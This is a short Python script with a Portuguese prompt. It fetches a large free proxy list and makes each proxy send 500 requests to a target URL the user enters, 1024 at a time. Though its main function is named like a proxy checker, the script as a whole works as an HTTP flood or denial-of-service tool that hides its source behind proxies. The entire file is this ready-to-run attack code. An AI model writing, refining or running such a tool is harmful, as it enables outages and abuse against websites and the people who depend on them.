import asyncio, aiohttp, sys
from urllib.parse import urlparse

async def chk(p, url, sem):
    async with sem:
        proxy = f"http://{p}"
        for _ in range(500):
            try:
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                    timeout=aiohttp.ClientTimeout(total=8)
                ) as s:
                    async with s.get(url, proxy=proxy) as r:
                        print(f"{p} / Sucess / Status {r.status}")
            except Exception:
                print(f"{p} / Fail / Status ---")

async def main():
    target = input("URL alvo: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    async with aiohttp.ClientSession() as s:
        async with s.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?"
            "request=displayproxies&protocol=http&timeout=10000&"
            "country=all&ssl=all&anonymity=all&skip=0&limit=2000000000"
        ) as r:
            plist = (await r.text()).splitlines()
    sem = asyncio.Semaphore(1024)
    await asyncio.gather(*(chk(p, target, sem) for p in plist if p))

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
